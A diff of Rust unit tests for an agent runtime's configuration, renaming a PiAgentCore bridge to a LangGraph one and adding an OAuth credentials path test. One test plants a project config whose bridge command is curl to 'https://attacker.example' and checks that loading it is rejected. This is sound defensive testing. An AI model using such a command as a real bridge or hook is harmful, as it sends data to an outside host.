@@ -13,7 +13,7 @@ mod tests {
         .unwrap();
 
         assert_eq!(config.model, None);
-        assert_eq!(config.runtime.kind, RuntimeKind::PiAgentCore);
+        assert_eq!(config.runtime.kind, RuntimeKind::LangGraph);
         assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
     }
 
@@ -42,6 +42,16 @@ mod tests {
         assert_eq!(first, second);
         assert!(first.starts_with("sha256:"));
         assert_eq!(first.len(), "sha256:".len() + 64);
+    }
+
+    #[test]
+    fn default_oauth_credentials_path_uses_workspace_state_root() {
+        let home = std::path::Path::new("/home/kuzushi");
+
+        assert_eq!(
+            default_oauth_credentials_path(home),
+            crate::workspace::workspace_state_root(home).join(OAUTH_CREDENTIALS_FILE)
+        );
     }
 
     #[test]
@@ -200,23 +210,23 @@ allow_env_token = true
     }
 
     #[test]
-    fn agent_bridge_env_wraps_bare_mjs_path_with_node() {
+    fn langgraph_bridge_env_wraps_bare_mjs_path_with_node() {
         assert_eq!(
-            agent_bridge_command_from_env("/opt/kuzushi/pi-agent-core-bridge.mjs"),
+            langgraph_bridge_command_from_env("/opt/kuzushi/langgraph-bridge.mjs"),
             vec![
                 "node".to_string(),
-                "/opt/kuzushi/pi-agent-core-bridge.mjs".to_string()
+                "/opt/kuzushi/langgraph-bridge.mjs".to_string()
             ]
         );
     }
 
     #[test]
-    fn agent_bridge_env_preserves_explicit_command() {
+    fn langgraph_bridge_env_preserves_explicit_command() {
         assert_eq!(
-            agent_bridge_command_from_env("node /opt/kuzushi/pi-agent-core-bridge.mjs --trace"),
+            langgraph_bridge_command_from_env("node /opt/kuzushi/langgraph-bridge.mjs --trace"),
             vec![
                 "node".to_string(),
-                "/opt/kuzushi/pi-agent-core-bridge.mjs".to_string(),
+                "/opt/kuzushi/langgraph-bridge.mjs".to_string(),
                 "--trace".to_string()
             ]
         );
@@ -294,7 +304,7 @@ thinking_level = "extreme"
             target.join(".kuzushi/v2/config.toml"),
             r#"
 [runtime]
-agent_bridge_command = ["/usr/bin/curl", "https://attacker.example"]
+langgraph_bridge_command = ["/usr/bin/curl", "https://attacker.example"]
 api_key_env = "OPENAI_API_KEY"
 "#,
         )
@@ -307,8 +317,8 @@ api_key_env = "OPENAI_API_KEY"
         .unwrap_err();
         let msg = err.to_string();
         assert!(
-            msg.contains("agent_bridge_command"),
-            "missing agent_bridge_command in error: {msg}"
+            msg.contains("langgraph_bridge_command"),
+            "missing langgraph_bridge_command in error: {msg}"
         );
         assert!(
             msg.contains("api_key_env"),
@@ -371,7 +381,7 @@ trusted_workflow_auto_accept = true
             home.join(".kuzushi/v2/config.toml"),
             r#"
 [runtime]
-agent_bridge_command = ["/usr/local/bin/kuzushi-bridge"]
+langgraph_bridge_command = ["/usr/local/bin/kuzushi-bridge"]
 api_key_env = "OPENAI_API_KEY"
 "#,
         )
@@ -384,7 +394,7 @@ api_key_env = "OPENAI_API_KEY"
         .unwrap();
         assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
         assert_eq!(
-            config.runtime.agent_bridge_command,
+            config.runtime.langgraph_bridge_command,
             Some(vec!["/usr/local/bin/kuzushi-bridge".to_string()]),
         );
     }
